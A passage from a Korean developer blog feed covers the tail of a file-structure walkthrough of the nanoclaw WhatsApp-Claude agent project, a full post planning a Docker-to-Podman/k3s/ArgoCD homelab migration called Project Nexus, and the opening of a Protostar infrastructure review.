    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">types.ts</code></td>
      <td>프로젝트 전체에서 사용되는 **타입 정의** (Channel, Message, Task 등)를 담고 있다</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">logger.ts</code></td>
      <td><code class="language-plaintext highlighter-rouge">pino</code> 기반의 **구조화된 로깅** 설정이다</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">whatsapp-auth.ts</code></td>
      <td>WhatsApp **QR 인증** 전용 스크립트이다</td>
    </tr>
  </tbody>
</table>

<h4 id="srcchannels--채널-추상화-계층"><code class="language-plaintext highlighter-rouge">src/channels/</code> — 채널 추상화 계층</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>channels/
├── whatsapp.ts        # WhatsApp 연결, 인증, 송/수신 구현체
└── whatsapp.test.ts   # WhatsApp 채널 테스트
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">Channel</code> 인터페이스를 통해 메시징 플랫폼을 추상화한 구조이다. 현재는 WhatsApp만 구현되어 있지만, 이 패턴 덕분에 Telegram 등 다른 채널도 쉽게 추가할 수 있는 확장 가능한 설계이다.</p>

<h3 id="container--에이전트-컨테이너-환경"><code class="language-plaintext highlighter-rouge">container/</code> — 에이전트 컨테이너 환경</h3>

<p>Claude Agent가 실제로 <strong>실행되는 격리된 환경</strong>을 구성하는 폴더이다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>container/
├── Dockerfile         # 에이전트 실행 환경 이미지 빌드 정의
├── build.sh           # 컨테이너 빌드 스크립트
├── agent-runner/      # 컨테이너 내부에서 실행되는 별도 Node.js 패키지
│   ├── package.json   # agent-runner 전용 의존성
│   ├── tsconfig.json
│   └── src/           # IPC MCP stdio 등 내부 통신 로직
└── skills/            # 에이전트에게 주입되는 스킬
    └── agent-browser/ # 브라우저 자동화 도구
</code></pre></div></div>

<p>핵심 포인트는 <strong>호스트 프로세스(src/)와 에이전트 런타임(container/agent-runner/)이 완전히 분리</strong>되어 있다는 것이다. 에이전트는 Apple Container(Linux VM) 안에서 돌아가기 때문에, 설령 AI가 위험한 명령을 실행하더라도 호스트 시스템에는 영향을 줄 수 없는 <strong>샌드박스(Sandbox)</strong> 구조이다. (AI의 자유와 시스템의 안전을 동시에 챙기는 아주 영리한 설계이다!)</p>

<h3 id="groups--그룹별-격리-메모리"><code class="language-plaintext highlighter-rouge">groups/</code> — 그룹별 격리 메모리</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>groups/
├── global/
│   └── CLAUDE.md      # 모든 그룹에 공통 적용되는 Claude 메모리
└── main/
    └── CLAUDE.md      # main 그룹 전용 Claude 메모리
</code></pre></div></div>

<p>각 WhatsApp 그룹(또는 개인 대화)은 고유한 폴더를 가지며, 해당 폴더의 <code class="language-plaintext highlighter-rouge">CLAUDE.md</code>가 <strong>그 그룹만의 개인화된 AI 메모리</strong> 역할을 한다. <code class="language-plaintext highlighter-rouge">global/</code>은 모든 그룹에 공통으로 적용되는 설정이고, <code class="language-plaintext highlighter-rouge">main/</code>은 메인(개인) 대화 전용이다. 그룹마다 파일시스템과 메모리가 <strong>완전히 격리</strong>되는 구조인 것이다.</p>

<h3 id="docs--프로젝트-문서"><code class="language-plaintext highlighter-rouge">docs/</code> — 프로젝트 문서</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docs/
├── SPEC.md                         # 전체 프로젝트 사양서 (가장 중요!)
├── REQUIREMENTS.md                 # 아키텍처 의사결정 기록
├── SDK_DEEP_DIVE.md                # Claude Agent SDK 심층 분석
├── SECURITY.md                     # 보안 모델 문서
├── DEBUG_CHECKLIST.md              # 디버깅 체크리스트
└── APPLE-CONTAINER-NETWORKING.md   # Apple Container 네트워킹 가이드
</code></pre></div></div>

<p>단순한 README를 넘어서 <strong>아키텍처 결정 근거(ADR)</strong>, <strong>보안 모델</strong>, <strong>SDK 분석</strong> 등이 체계적으로 정리되어 있다. 특히 <code class="language-plaintext highlighter-rouge">SPEC.md</code>와 <code class="language-plaintext highlighter-rouge">REQUIREMENTS.md</code>는 프로젝트를 이해하는 데 가장 중요한 문서이다.</p>

<h3 id="config-examples--설정-예시"><code class="language-plaintext highlighter-rouge">config-examples/</code> — 설정 예시</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>config-examples/
└── mount-allowlist.json   # 컨테이너 마운트 허용 경로 설정 예시
</code></pre></div></div>

<p>컨테이너에 어떤 호스트 디렉토리를 마운트할 수 있는지 제어하는 <strong>보안 설정의 예시 파일</strong>이다. 실제 설정은 <code class="language-plaintext highlighter-rouge">~/.config/nanoclaw/mount-allowlist.json</code>에 위치하며, 의도적으로 프로젝트 루트 <strong>바깥</strong>에 두어 에이전트가 임의로 수정할 수 없도록 설계했다. (파일 하나에 보안 철학이 담겨 있는 셈이다!)</p>

<h3 id="launchd--macos-서비스-데몬"><code class="language-plaintext highlighter-rouge">launchd/</code> — macOS 서비스 데몬</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>launchd/
└── com.nanoclaw.plist     # macOS LaunchAgent 설정
</code></pre></div></div>

<p>nanoclaw을 macOS의 <strong>백그라운드 서비스</strong>로 등록하기 위한 plist 파일이다. <code class="language-plaintext highlighter-rouge">launchctl load</code>/<code class="language-plaintext highlighter-rouge">unload</code> 명령으로 시스템 시작 시 자동 실행되도록 구성할 수 있다.</p>

<h3 id="루트-설정-파일들">루트 설정 파일들</h3>

<table>
  <thead>
    <tr>
      <th>파일</th>
      <th>역할</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">package.json</code></td>
      <td>프로젝트 의존성, 스크립트, 엔진 버전 정의</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">tsconfig.json</code></td>
      <td>TypeScript 컴파일러 설정</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">vitest.config.ts</code></td>
      <td>Vitest 테스트 프레임워크 설정</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">.prettierrc</code></td>
      <td>코드 포맷팅 규칙</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">.gitignore</code></td>
      <td>Git 추적 제외 파일 목록</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">.mcp.json</code></td>
      <td>MCP(Model Context Protocol) 설정</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">CLAUDE.md</code></td>
      <td>Claude AI에게 프로젝트 구조와 명령을 알려주는 컨텍스트 파일</td>
    </tr>
  </tbody>
</table>

<hr />
<p>nanoclaw은 <strong>“메시징 인터페이스 → 메시지 라우팅 → 격리된 컨테이너에서 AI 실행 → 결과 반환”</strong> 이라는 깔끔한 파이프라인 구조를 가진 프로젝트이다. 호스트와 에이전트의 완전한 분리, 그룹별 메모리 격리, 마운트 보안까지 — AI 백엔드 아키텍처의 정석을 잘 보여주고 있다.</p>

<hr />

<h2 id="향후-학습-방향성">향후 학습 방향성</h2>

<h3 id="-1단계-전체-흐름-파악-big-picture">🥇 1단계: 전체 흐름 파악 (Big Picture)</h3>

<table>
  <thead>
    <tr>
      <th>순서</th>
      <th>파일</th>
      <th>이유</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>①</td>
      <td>SPEC.md</td>
      <td>코드를 보기 전에 전체 사양서를 먼저 읽으면, 각 모듈이 **왜** 그렇게 설계됐는지 맥락확인하기</td>
    </tr>
    <tr>
      <td>②</td>
      <td>types.ts</td>
      <td>Channel, NewMessage, ScheduledTask 등 핵심 타입들이 정의되어 있어서 전체 데이터 흐름의 파악하기</td>
    </tr>
    <tr>
      <td>③</td>
      <td>config.ts</td>
      <td>트리거 패턴, 타임아웃, 동시 컨테이너 수 등 시스템 동작을 결정하는 **설정값**들 역으로 분석하기</td>
    </tr>
  </tbody>
</table>

<h3 id="-2단계-핵심-파이프라인-메시지--ai-실행--응답">🥈 2단계: 핵심 파이프라인 (메시지 → AI 실행 → 응답)</h3>

<table>
  <thead>
    <tr>
      <th>순서</th>
      <th>파일</th>
      <th>이유</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>④</td>
      <td>index.ts</td>
      <td>**오케스트레이터** — 메시지가 들어오면 어떻게 처리되는지, AI 에이전트를 언제 호출하는지 전체 흐름의 중심</td>
    </tr>
    <tr>
      <td>⑤</td>
      <td>container-runner.ts</td>
      <td>**가장 중요한 파일** Claude Agent를 Apple Container 안에서 어떻게 스폰하고, 마운트를 설정하고, 결과를 받아오는지가 다 여기 있어요. AI 실행 아키텍처의 핵심. 파악해둘 것</td>
    </tr>
    <tr>
      <td>⑥</td>
      <td>ipc.ts</td>
      <td>호스트↔컨테이너 간의 **IPC 통신 메커니즘** — AI 에이전트가 결과를 어떻게 전달하는지 파악하기</td>
    </tr>
  </tbody>
</table>

<h3 id="-3단계-보조-시스템">🥉 3단계: 보조 시스템</h3>

<table>
  <thead>
    <tr>
      <th>순서</th>
      <th>파일</th>
      <th>이유</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>⑦</td>
      <td>mount-security.ts</td>
      <td>AI에게 파일 접근을 주되, **어디까지 허용할 것인가**의 보안 로직. 실무에서 AI 서비스를 운영할 때 반드시 고려해야 할 부분.</td>
    </tr>
    <tr>
      <td>⑧</td>
      <td>task-scheduler.ts</td>
      <td>AI에게 **예약 작업**을 시킬 수 있는 스케줄러. cron/interval/once 패턴이 깔끔하게 구현되어 있으므로 알아둘 것</td>
    </tr>
    <tr>
      <td>⑨</td>
      <td>db.ts</td>
      <td>대화 기록, 태스크 로그 등을 SQLite로 어떻게 관리하는지 볼 수 있음</td>
    </tr>
  </tbody>
</table>

<h3 id="-4단계-컨테이너-내부-에이전트-시점">🔍 4단계: 컨테이너 내부 (에이전트 시점)</h3>

<table>
  <thead>
    <tr>
      <th>순서</th>
      <th>파일</th>
      <th>이유</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>⑩</td>
      <td>container/agent-runner/</td>
      <td>컨테이너 **안에서** 돌아가는 에이전트의 런타임 코드. 호스트 코드와 어떻게 IPC로 대화하는지를 에이전트 시점에서 확인할 것</td>
    </tr>
    <tr>
      <td>⑪</td>
      <td>SDK_DEEP_DIVE.md</td>
      <td>Claude Agent SDK를 깊게 파헤친 문서. SDK 활용법을 체계적으로 이해할 수 있음.</td>
    </tr>
  </tbody>
</table>]]></content><author><name>Paul2021-R</name></author><category term="문제해결" /><category term="AI" /><category term="Study" /><category term="Review" /><category term="NanoClaw" /><summary type="html"><![CDATA[0. Why this Project? 본 프로젝트는 AI 응용 어플리케이션 구축에서 필요한 내용, agentic AI 구축을 위하여 필요한 것들에 대한 이해도를 높이고, 현재 진행중인 Nexus 프로젝트 이후 AI 기반의 서비스 구축 능력을 갖추기 위한 첫 도전이다. 당장 무언가를 만들기보단, 잘 만들어진 예시를 기반으로 RAG 이상의 기능 구현을 어떤 식으로 접근하면 좋을지 사전 학습 겸 하여 진행하게 되었다. 코드 레포지터리]]></summary></entry><entry><title type="html">Project Nexus - Docker를 넘어, 진짜 인프라로</title><link href="http://0.0.0.0:4000/%ED%94%84%EB%A1%9C%EC%A0%9D%ED%8A%B8/2026/02/10/00-init-project-nexus.html" rel="alternate" type="text/html" title="Project Nexus - Docker를 넘어, 진짜 인프라로" /><published>2026-02-10T00:00:00+00:00</published><updated>2026-02-10T00:00:00+00:00</updated><id>http://0.0.0.0:4000/%ED%94%84%EB%A1%9C%EC%A0%9D%ED%8A%B8/2026/02/10/00-init-project-nexus</id><content type="html" xml:base="http://0.0.0.0:4000/%ED%94%84%EB%A1%9C%EC%A0%9D%ED%8A%B8/2026/02/10/00-init-project-nexus.html"><![CDATA[<h2 id="project-nexus-docker를-넘어-진짜-인프라로">Project Nexus: Docker를 넘어, 진짜 인프라로</h2>

<blockquote>
  <p>불완전 연소된 ProtoStar를 살리고 다음을 준비하기 위한 플레이그라운드의 필요성, 3년차 개발자 수준의 인프라 역량을 만드는 여정</p>
</blockquote>

<hr />

<h3 id="출발점-불완전연소된-protostar-그리고">출발점: 불완전연소된 ProtoStar 그리고…</h3>

<p>1년차 메인 서버 개발자로 역할을 수행했다. 그리고 이젠 3년차 개발자의 역량을 갖추어야 다음 도전이 가능하리라 생각하고 있었다. <strong>그런데 AI는 여기서 한 발 더 나아가, 개발자에게 요구되는 역량을 크게 변화시켰다.</strong></p>

<p>그 점을 고려하지 않는다면 생존에서 불가피할 것이라는 생각을 하였고, 결과적으로 AI 와 DevOps 의 역량을 갖추고, 백엔드 개발자로서 제대로된 인프라를 구축하는 역량을, <strong>소프트웨어 아키텍처이자, 오케스트레이터가 되어야 한다고 판단했다.</strong></p>

<p>그리하여 토스 러너스 하이 2기와 함께 시작한 Protostar 프로젝트는 나름 성공적이었다. Next.js 기반의 프론트엔드-챗봇을 구현하고, 백엔드는 Nest.js, FastAPI 를 이용하며 고가용성 체계를 구축하는 과정은 확실히 단순한 백엔드 설계를 넘어서는 여러 도전 요소들을 갖고 있고, 그 결과가 현재 블로그 상에 올라가 있는 챗봇이다.</p>

<p>자못 훌륭하며, 개인적으로 1달이란 시간에 이걸 했다는 사실은 자부심을 가지기에 충분하지 않을까? AI도 DevOps 도 백엔드 설계 역량도 보여줄 수 있는 것들이 있었으니,  자랑스럽게 자랑을 인터뷰 상에서 할 수 있다면 좋겠다 생각한다.</p>

<p><strong>하지만 한편으로 아쉬움은 있다.</strong></p>

<p>기획의 한계, 고려사항들이 있단 점에서 온전한 서비스로의 확장은 포기했다-는 점은 제외하더라도,
기술적 아쉬움, 특히 DevOps 경험에 대한 아쉬움이 크게 남았다.</p>

<p>k8s 방식을 정복할 시간이 부족해 포기했다. 또한 무엇보다 Docker 로 구현 시 안되는 건 없지만, 그렇다고 <strong>‘온전하게’ 유기적으로 동작하지 않는다고 느낀 부분들이 있었다.</strong> Docker Swarm, ReplicaSet 등을 기반으로 고가용성을 구현할 순 있다. 하지만 한계는 명백했다. <strong>k8s 를 선택했을 때 얻을 수 있는 이점에 대해 다시 한 번 떠오르게 되었다.</strong></p>

<p>뿐만 아니라 온프레미스 서버에 약 100여만원을 투자하여 나만의 홈랩을 꾸미게 되면서 깨달은게 있다.</p>

<p>실무 경험이 중요한 이유는, 실무 수준에서의 책임감, 안정성, 고려할 사항 등, 단순히 개인의 자그마한 데모 수준에서는 알 수 없는 ‘실무의 깊이’와 ‘실무의 너비’가 존재한다. 그런 점에서 인프라를 개인의 신분으로 지원 없이 AWS, GCP 등에 올린다면? 유료 사용에서 한계가 발생하고, 할 수 있는 수준의 제약이 발생했을 것이다.</p>

<p>그런데 홈랩으로 꾸미게 되면서, 그러한 한계가 상당 부분 사라졌다. 결국 ‘규모의 경제’는 곧 경험인 것이다.</p>

<p>덕분에 과감히 인프라 선택이 가능하고, 효과적으로 기술을 적용할 수 있었다. 그렇다면 할 일은 무엇인가? 그건 결국 ‘앞으로 가는 것’ 아니겠는가? 결국 인프라는 있으니 더 명료하게 IaC(Infrastructure as Code)를 구현하고, 내가 경험할 수 있는 최선의 인프라 위에서 또 다른 도전을 해야 그게 진짜가 되지 않을까?</p>

<p><strong>그런 점에서 나만의 플레이그라운드, 기반이 필요하다고 판단했다. 그것이 Nexus(기반), 완전한 k8s 기반의 GitOps 서버 클러스터 구축 프로젝트이다.</strong></p>

<hr />

<h3 id="깨달음-지향할-푯대는-어디로-향하는가">깨달음: 지향할 푯대는 어디로 향하는가?</h3>

<h4 id="docker만-쓰던-시절의-한계">Docker만 쓰던 시절의 한계</h4>

<p>Docker는 훌륭한 도구다. 메인 서버로 1년 간 살면서, Docker 로 옮긴 레거시 서버들은 덕분에 엄청난 포텐셜을 얻었고, 최적화, 관리 편의성을 얻었기에 지금의 내 경험, 이력을 만들 수 있었다고 해도 과언이 아니다. 그런 점에서 서비스를 바로 시작하기에 Docker 만한 컨테이닝은 없다고 생각한다.</p>

<p>하지만 막상 ‘고가용성’이란 목표를 지향했을 때 Docker 는 굉장히 아쉬움을 불러일으켰다.</p>

<ol>
  <li><strong>데몬에 종속된 구조</strong>: dockerd가 죽으면 모든 컨테이너가 영향을 받는다. 단일 장애점(SPOF)이 존재한다는 점은 고가용성을 생각할 때, 문제였다. 하나의 컨테이너가 과도한 사용량을 차지하게 되었을 때, 전체 시스템은 문제가 발생한다. AWS 에서 인스턴스를 여러개 분산하는 대안도 있다. 그러나 이는 또 다른 복잡도의 서막이며 대안이 되진 못했다. 어디까지나 보완책이었다.</li>
  <li><strong>보안 취약성</strong>: 기본적으로 root 권한이 필요하다는게 생각보다 큰 부담이었다. rootless 모드는 있지만 2차 시민 취급이었다. 또한 이러한 보안 이슈로 공식 이미지들 마다 다르게 권한이 설정되는 등으로 문제가 되었다.</li>
  <li><strong>k8s와의 괴리감</strong>: Docker Compose로 개발하고, k8s YAML로 배포한다? 로컬과 프로덕션 환경이 달라지고 이는 완벽하지 않은 환경 통제였다. ‘완벽함’이 필요한 백엔드 환경 구축에서 한 점의 오차는 ‘아마추어’란 사실을 증명하는 꼴이라고 생각이 들었다. 플랫폼이 다르면 증상도 달라지고, 특히 이전 후기에서도 다뤘듯, 각 개별 설계가 의존성이 없어도, 관계의 통합은 의존성을 만들고 새로운 증상을 유도한다.</li>
  <li><strong>스크립트 단위의 파편화된 관리 구조</strong>: Dockerfile, docker-compose.yml, Jenkinsfile, 쉘 스크립트 등, CI/CD 파이프라이닝을 구축해보고 얻은 결론은 명확했다. 각각 분리되어 각 역할을 보기엔 명료해보이고 유기적이게 보인다. 하지만 반대로 그렇기에 한 곳을 수정하면 예상하지 못한 곳의 문제가 발생할 수 있고, 이는 결국 ‘단독’으로 볼 때만 ‘희극’이며 ‘전체’를 볼 땐 ‘비극’이었다.</li>
  <li><strong>상태관리의 어려움</strong>: PostgreSQL 이나, Redis, 모니터링 등의 Stateful 서비스에 대한 백업/ 복구 전략에서 수동으로 해야 하는 영역이 존재하며, 고가용성 구성이 상당히 복잡했다.</li>
</ol>

<h4 id="엔터프라이즈-환경에서-요구하는-역량">엔터프라이즈 환경에서 요구하는 역량</h4>

<p>AI를 기반으로 약 100개 정도의 주요 기업들의 백엔드 엔지니어 직군의 공고문을 딥리서치 해보았다. 내가 3년차 수준을 인정 받길 원한다면 단순히 “Docker 써봤어요”로는 부족했다. 이를 압축해서 정리하면 다음과 같았다.</p>

<ul>
  <li><strong>컨테이너 오케스트레이션</strong>: Kubernetes를 실무에서 사용할 수 있고, 이를 기반으로 서비스의 생명주기 제어가 가능한가?</li>
  <li><strong>보안 의식</strong>: 특히 최근의 중요사항이자, 국내에서도 중요해지고 있는 영역으로 서버들 사이의 격리가 명료한가? rootless 컨테이너, 권한 분리, 이미지 스캐닝의 경험이 있는가?</li>
  <li><strong>자동화</strong>: CI/CD 파이프라인의 현대화, GitOps, 롤링 업데이트 등을 통해 서비스의 무결성이 확보되는가? 개발 생산성을 확보 하는가?</li>
  <li><strong>관찰성</strong>: 메트릭, 로그, 추적 시스템 구축하여 운영 문제를 소프트웨어 엔지니어링 방식으로 해결할 수 있는가? SRE(Site Reliability Engineering) 방식으로 대규모 시스템의 안정성, 확장성, 가용성을 극대화 가능한가?</li>
</ul>

<p>결국 안정성, 효율성, 운영 최적화된 역량이 필요했다. 이러한 영역에 대한 나만의 답이 필요했고, 결국 내가 생존하기 위하여 필요한 ‘전문성’이란 무엇인가를 명확하게 정리할 수 있었다.</p>

<hr />

<h3 id="전략-초-현실주의">전략: ‘초’ 현실주의</h3>

<h4 id="온프레미스-서버를-프로덕션-클러스터로">온프레미스 서버를 프로덕션 클러스터로</h4>

<p>보다 현실적이게 짜야 한다고 생각했다. 연습용의 minikube 정도가 아니라 프로덕션처럼 운영을 위한 구성과 실천이 되어야 한다고 판단했다. 오버 엔지니어링, 허세를 하고 싶단 말은 아니다. 현실적으로 과도하지 않으면서도 진짜 엔터프라이즈급을 지향해본다는 그 벨런스를 중요시했다. 향후 더 많은 기술의 플레이그라운드 만들기를 지향한다.</p>

<p>Protostar가 구동 중인 서버 어플리케이션들은 현재 두 대의 온프레미스 서버에서 동작하고 있다. 메인 서버는 서비스를, 서브 서버는 모니터링 / 빌드 및 배포 파이프라인을 담당하고 있다.</p>

<p>여기서 단순히 k8s 를 위한 플랫폼을 설치, k8s 용 스크립트 작성을 해도 되지만… 보다 현실적이고, 무엇보다 IaC 를 극대화하기 위해선, 온프레미스 서버들이 마치 하나처럼 동작하게 만드는 것이 반드시 필요하다고 생각했다.</p>

<p><strong>결론적으로 계획은 이렇다:</strong></p>
<ul>
  <li>개발용으로는 단일 개발 PC에서 작업하여 Podman 기반으로 Docker-free 를 달성.</li>
  <li>Production 은 두 개의 온프레미스 서버에 k3s 기반 Kubernetes 클러스터링을 한다. namespace 를 기반으로 역할을 설정한다. 즉, 한 대 같은 두 대를 만들고, 각 영역은 ‘목적’을 포함시킨다.</li>
  <li>현재 가동 중인 ProtoStar 서비스를 이 환경으로 완전히 마이그레이션한다.(서비스 + 모니터링 스택)</li>
  <li>위의 작업들의 종결 이후, 새로운 서비스들 역시 여기서 동작하며, 테스팅 되며, 배포 된다.</li>
</ul>

<h4 id="로컬에서-프로덕션까지-일관된-환경">로컬에서 프로덕션까지 일관된 환경</h4>

<p>가장 중요한 원칙: <strong>로컬 개발 환경과 프로덕션 환경을 최대한 비슷하게 만들어내는 것이다.</strong></p>

<p><strong>기존 방식:</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>로컬 / 프로덕션: Docker Compose 기반, Jenkins 파이프라이닝 때문에 환경변수를 비롯 차이점 있음
→ 환경이 달라서 "내 컴퓨터에선 되는데요?" 발생, 결과적으로 이미지 차원의 변경 발생 시 2회 적용 되어야 함
</code></pre></div></div>

<p><strong>새로운 방식:</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>로컬: Podman + k8s YAML
프로덕션: k3s + k8s YAML
→ 같은 YAML 파일을 로컬과 클러스터에서 모두 사용
</code></pre></div></div>

<p>Podman의 <code class="language-plaintext highlighter-rouge">podman play kube</code> 명령어를 쓰면 k8s YAML을 로컬에서도 그대로 실행할 수 있다. 이게 핵심이다.</p>

<h4 id="계획">계획</h4>

<p>무작정 달려들기보단, AI 를 기반으로 구현할 항목들을 정리했고, 목표를 지정하였다. 이직 일정과 겹쳐 딜레이가 발생할 순 있으나 최대한 현실적으로 설정해보았다.</p>

<p><strong>Phase 1 (1주): 도구 전환</strong></p>

<ul>
  <li>Docker → Podman 로컬 개발 환경 전환</li>
  <li>기존 Dockerfile이 Podman에서도 돌아가는지 검증</li>
  <li>rootless 환경의 포트 바인딩 제약 해결 (80 → 8080)</li>
</ul>

<p><strong>Phase 2 (0.5주): k8s 기초</strong></p>

<ul>
  <li>k3s 클러스터 구축</li>
  <li>Pod, Deployment, Service 개념 실습</li>
  <li>kubectl 명령어 익히기</li>
</ul>

<p><strong>Phase 3 (0.5주): Dev 환경에 Stateless 서비스 먼저</strong></p>

<ul>
  <li>React, NestJS 같은 무상태 서비스부터 배포</li>
  <li>실패해도 재배포하면 끝이라 학습 비용이 낮음</li>
  <li>서비스 간 통신 (k8s 내부 DNS) 이해</li>
</ul>

<p><strong>Phase 4 (0.5주): Dev 환경에 Stateful 서비스 마이그레이션 해보기</strong></p>

<ul>
  <li>PostgreSQL, Redis 같은 상태 저장 서비스</li>
  <li>StatefulSet, PersistentVolume 개념</li>
  <li>데이터 백업/복구 전략 수립</li>
</ul>

<p><strong>Phase 5 (1주): 자동화와 관찰성</strong></p>

<ul>
  <li>ArgoCD 기반 GitOps CI/CD 파이프라인 구축</li>
  <li>Prometheus + Grafana 모니터링 스택</li>
</ul>

<p><strong>Phase 6 (1주): Production 마이그레이션</strong></p>

<ul>
  <li>지금까지의 실습을 모두 클러스터링 된 온프레미스 서버로 일체 이전한다.</li>
</ul>

<hr />

<h3 id="도구-왜-이-스택인가">도구: 왜 이 스택인가</h3>

<h4 id="podman-보안과-확장성">Podman: 보안과 확장성</h4>

<p><strong>선택 이유 세 가지:</strong></p>

<ol>
  <li><strong>Rootless가 기본</strong>: 일반 사용자 권한으로 컨테이너 실행. 보안 침해 시 피해 범위가 제한된다.</li>
  <li><strong>Daemonless 아키텍처</strong>: 중앙 데몬 없이 각 컨테이너가 독립적으로 실행. dockerd가 죽어서 전체가 멈추는 일이 없다.</li>
  <li><strong>Pod 네이티브 지원</strong>: k8s Pod 개념을 로컬에서도 그대로 사용 가능. 같은 Pod 안의 컨테이너끼리 localhost로 통신한다.</li>
</ol>

<p><strong>리스크:</strong></p>
<ul>
  <li>커뮤니티가 Docker보다 작아서 문제 발생 시 레퍼런스가 적을 수 있음</li>
  <li>일부 Docker 전용 도구와 호환성 이슈 가능 (예: Docker Desktop 기능들)</li>
</ul>

<h4 id="kubernetes-k3s-업계-표준">Kubernetes (k3s): 업계 표준</h4>

<p><strong>선택 이유 세 가지:</strong></p>

<ol>
  <li><strong>업계 표준</strong>: 대부분의 엔터프라이즈 환경이 k8s를 사용. 실무 경험으로 직결된다.</li>
  <li><strong>선언적 구성</strong>: YAML로 원하는 상태를 선언하면 k8s가 알아서 그 상태를 유지한다.</li>
  <li><strong>확장성</strong>: 단일 노드에서 시작해도 나중에 멀티 클러스터로 확장이 자연스럽다.</li>
</ol>

<p><strong>k3s를 선택한 이유:</strong></p>
<ul>
  <li>표준 k8s보다 가볍고 빠름 (메모리 사용량 절반)</li>
  <li>온프레미스 환경에 최적화</li>
  <li>Traefik Ingress가 기본 내장</li>
</ul>

<p><strong>리스크:</strong></p>
<ul>
  <li>학습 곡선이 가파름. Pod, Deployment, Service, Ingress 등 개념이 많음</li>
  <li>초기 설정이 복잡할 수 있음</li>
</ul>

<h4 id="gitops-argocd-자동화와-추적성">GitOps (ArgoCD): 자동화와 추적성</h4>

<p><strong>선택 이유 세 가지:</strong></p>

<ol>
  <li><strong>Git이 진실의 원천</strong>: 모든 배포 상태가 Git 저장소에 기록됨. 언제든 이전 상태로 롤백 가능.</li>
  <li><strong>자동 동기화</strong>: Git에 푸시하면 자동으로 클러스터에 반영. 수동 배포 작업 제거.</li>
  <li><strong>가시성</strong>: 무엇이 언제 누구에 의해 배포되었는지 명확하게 추적 가능.</li>
</ol>

<p><strong>리스크:</strong></p>
<ul>
  <li>초기 설정이 복잡할 수 있음</li>
  <li>Git과 클러스터 상태가 어긋날 경우 디버깅이 어려울 수 있음</li>
</ul>

<hr />

<h3 id="마무리-왜-이-여정이-중요한가">마무리: 왜 이 여정이 중요한가</h3>

<p>이 프로젝트는 단순히 기술 스택을 바꾸는 것이 아니다. <strong>“할 줄 안다”에서 “제대로 한다”로의 전환을 생각하고 있다.</strong></p>

<p>Docker Compose로 띄우는 것과 k8s 클러스터를 운영하는 것은 완전히 다른 차원이다. 전자는 개발자의 편의를 위한 도구이고, 후자는 프로덕션 환경을 위한 플랫폼이다.</p>

<p>ProtoStar는 더 이상 불완전연소된 프로젝트가 아니라, 이제 <strong>내가 엔터프라이즈급 인프라를 구축할 수 있다는 것을 증명하는 살아있는 증거</strong>가 되도록 만들고 싶다. 또한 AI가 개인이 할 수 있는 영역을 극대화 시켜줄 것이니 Nexus 는 그 토대가 될 것이다. 내가 만들 다양한 어플리케이션들의 토대가 되어줄 것이다. 십년의 대장정의 모험이 있다고 하면, 그 기반 중에 기반이 되리라 생각한다.</p>

<p>경험이 현실이 되고, 현실이 직무가 된다. 단순히 개발자라고 불리고 싶진 않다. ‘전문가’가 되어 회사의 시스템들의 운용을 정말 ‘현실적으로’ 해내길 원한다. 그 초석을 만들고 싶다.</p>]]></content><author><name>Paul2021-R</name></author><category term="프로젝트" /><category term="Backend" /><category term="개발" /><category term="Nexus" /><category term="K8s" /><summary type="html"><![CDATA[Project Nexus: Docker를 넘어, 진짜 인프라로]]></summary></entry><entry><title type="html">Protostar review note - 00 - infrastructure</title><link href="http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/02/10/01-protostar-review.html" rel="alternate" type="text/html" title="Protostar review note - 00 - infrastructure" /><published>2026-02-10T00:00:00+00:00</published><updated>2026-02-10T00:00:00+00:00</updated><id>http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/02/10/01-protostar-review</id><content type="html" xml:base="http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/02/10/01-protostar-review.html"><![CDATA[<h2 id="핵심-특징-5가지">핵심 특징 5가지</h2>
<ol>
  <li>물리적 / 논리적 망 분리 : 서비스 존과 매니징 존을 분리하였고, 이를 통한 운영 안정성을 확보함.</li>
  <li>트래픽 제어를 위한 Nginx 레이어에서의 Traffic Dam :
    <ul>
      <li>토큰 버킷 알고리즘 기반의 트래픽 제어
        <ul>
          <li>Heavy Zone, Light Zone 으로 구분하여서 매크로성을 엄격히 막아야 하는 위치(Backend), 정적 리소스 로딩을 위한 일반 존(Frontend)로 구분하여 로딩속성과 백엔드 서비스 보호를 양립함.</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>투명한 IP 보존(L4, L7 Proxy Protocol)
    <ul>
      <li>두대의 서버, 한대의 공유기의 네트워크 환경에서 클라이언트의 원본 IP 를 추적하기 위함, 동시에 각 서버의 HTTPS 접속을 구현함으로서 서비스 서버와 메인터넌스 서버에 접속하는 루트를 분리. 이를 통한 서비스 서버의 문제가 발생하더라도, 이를 모니터링하는 서버의 접속은 문제 없도록 만들어냄</li>
    </ul>
  </li>
